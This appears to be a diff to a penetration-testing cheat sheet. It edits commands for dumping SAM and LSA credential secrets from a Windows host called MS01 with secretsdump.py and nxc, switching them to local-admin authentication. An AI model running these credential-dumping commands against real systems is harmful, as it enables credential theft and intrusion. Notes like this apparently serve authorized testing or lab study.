@@ -6,8 +6,8 @@
 
 ### Dump cached pwds and logonpwds
 ```bash
-python3 secretsdump.py "$domain/$domainuser:$domainuserpwd@MS01"
-nxc smb MS01 -u $domainuser -p "$domainuserpwd" --sam --lsa
+python3 secretsdump.py "$localadmin:$localadminpwd@MS01"
+nxc smb MS01 -u $localadmin -p "$localadminpwd" --sam --lsa --local-auth
 ```
 
 ### Ligolo tunnel
